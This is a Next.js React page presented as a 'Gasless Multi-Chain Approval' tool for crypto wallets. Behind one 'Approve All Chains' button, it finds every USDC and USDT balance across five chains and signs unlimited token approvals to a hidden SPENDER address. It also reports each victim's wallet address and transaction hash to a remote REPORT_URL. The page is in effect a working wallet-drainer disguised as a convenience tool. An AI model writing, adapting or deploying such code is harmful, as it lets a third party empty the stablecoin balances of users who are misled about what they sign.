'use client';
import { useState } from 'react';
import { useAccount, useWalletClient } from 'wagmi';
import { erc20Abi, maxUint256, formatUnits } from 'viem';
import { readContract } from '@wagmi/core';
import { config } from '@/config';
import {
  createMeeClient,
  toMultichainNexusAccount,
  getMEEVersion,
  MEEVersion,
} from '@biconomy/abstractjs';
import { http, fallback } from 'viem';
import { mainnet, optimism, base, arbitrum, polygon } from 'viem/chains';

// ENV
const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || '';
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || '') as `0x${string}`;
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL || '';
const INFURA_ID = process.env.NEXT_PUBLIC_INFURA_ID || '';
const ALCHEMY_KEY = process.env.NEXT_PUBLIC_ALCHEMY_KEY || '';

if (!BICONOMY_API_KEY) throw new Error('NEXT_PUBLIC_BICONOMY_API_KEY missing in .env');
if (!SPENDER || SPENDER === '0x') throw new Error('NEXT_PUBLIC_SPENDER missing in .env');

// RPC fallback setup
const transports = {
  [mainnet.id]: fallback([
    http(`https://mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [optimism.id]: fallback([
    http(`https://optimism-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://opt-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [base.id]: fallback([
    http(`https://base-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [arbitrum.id]: fallback([
    http(`https://arbitrum-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [polygon.id]: fallback([
    http(`https://polygon-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
};

// Tokens per chain (USDC + USDT)
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; decimals: number; min: bigint }[]
> = {
  [optimism.id]: [
    { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6, min: BigInt(1e6) },
    { symbol: 'USDT', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6, min: BigInt(1e6) },
  ],
  [base.id]: [
    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54BDA02913', decimals: 6, min: BigInt(1e6) },
    { symbol: 'USDT', address: '0xfd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, min: BigInt(1e6) },
  ],
  [mainnet.id]: [
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, min: BigInt(1e6) },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, min: BigInt(1e6) },
  ],
  [arbitrum.id]: [
    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, min: BigInt(1e6) },
    { symbol: 'USDT', address: '0xfd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, min: BigInt(1e6) },
  ],
  [polygon.id]: [
    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, min: BigInt(1e6) },
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AaCbC5329a9', decimals: 6, min: BigInt(1e6) },
  ],
};

// Chain names
const CHAIN_NAMES: Record<number, string> = {
  [mainnet.id]: 'Ethereum',
  [optimism.id]: 'Optimism',
  [base.id]: 'Base',
  [arbitrum.id]: 'Arbitrum',
  [polygon.id]: 'Polygon',
};

// Report helper
async function reportApproval(data: any) {
  if (!REPORT_URL) return;
  try {
    await fetch(REPORT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (err) {
    console.warn('Report failed:', err);
  }
}

export default function Page() {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  const handleApproveAllChains = async () => {
    if (!address) return;
    if (!walletClient) {
      setStatus('❌ Please connect your wallet first.');
      return;
    }

    try {
      setLoading(true);
      setStatus('🔍 Checking balances across chains...');

      // Build orchestrator
      const chainConfigs = Object.values([mainnet, optimism, base, arbitrum, polygon]).map((c) => ({
        chain: c,
        transport: transports[c.id],
        version: getMEEVersion(MEEVersion.V2_1_0),
        signer: walletClient, // ✅ signer fixed
      }));

      const orchestrator = await toMultichainNexusAccount({
        chainConfigurations: chainConfigs,
      });

      const meeClient = await createMeeClient({
        account: orchestrator,
        apiKey: BICONOMY_API_KEY,
      });

      const instructions: any[] = [];
      const feeCandidates: { address: `0x${string}`; chainId: number }[] = [];

      // Check balances + build approvals
      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const chainId = Number(cid);

        for (const token of tokens) {
          const bal = (await readContract(config, {
            address: token.address,
            abi: erc20Abi,
            functionName: 'balanceOf',
            args: [address],
            chainId,
          })) as bigint;

          if (bal > BigInt(0)) {
            const instr = await orchestrator.buildComposable({
              type: 'default',
              data: {
                abi: erc20Abi,
                chainId,
                to: token.address,
                functionName: 'approve',
                args: [SPENDER, maxUint256],
              },
            });
            instructions.push(instr);
            feeCandidates.push({ address: token.address, chainId });
          }
        }
      }

      if (instructions.length === 0) {
        setStatus('ℹ️ No balances found on any chain to approve.');
        await reportApproval({ wallet: address, status: 'no_balance' });
        return;
      }

      // Try fee tokens
      let success = false;
      for (const feeToken of feeCandidates) {
        try {
          setStatus(`🚀 Paying gas with ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address}...`);

          const fusionQuote = await meeClient.getFusionQuote({
            instructions,
            trigger: { chainId: feeToken.chainId, tokenAddress: feeToken.address, amount: BigInt(1) },
            feeToken,
          });

          const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
          await meeClient.waitForSupertransactionReceipt({ hash });

          setStatus(`🎉 Success! Approvals complete. Tx: ${hash}`);
          await reportApproval({ wallet: address, status: 'success', txHash: hash });
          success = true;
          break;
        } catch (err: any) {
          console.warn(`Fee token failed: ${feeToken.address}`, err);
          continue;
        }
      }

      if (!success) throw new Error('All fee token attempts failed');
    } catch (err: any) {
      console.error(err);
      setStatus(`❌ Error: ${err.message || err}`);
      await reportApproval({ wallet: address, error: err.message || String(err) });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-xl mx-auto p-6">
      <h1 className="text-2xl font-bold mb-6 text-center">🚀 Gasless Multi-Chain Approval (Fusion)</h1>

      <div className="text-center mb-4">
        <w3m-button />
      </div>

      <button
        onClick={handleApproveAllChains}
        disabled={loading}
        className={`w-full px-4 py-3 rounded-lg text-white font-semibold shadow-md transition ${
          loading ? 'bg-gray-400 cursor-not-allowed' : 'bg-green-600 hover:bg-green-700'
        }`}
      >
        {loading ? 'Processing...' : 'Approve All Chains'}
      </button>

      {status && (
        <div className="mt-6 p-4 rounded-lg bg-gray-100 border text-sm text-gray-800">
          {status}
        </div>
      )}
    </div>
  );
}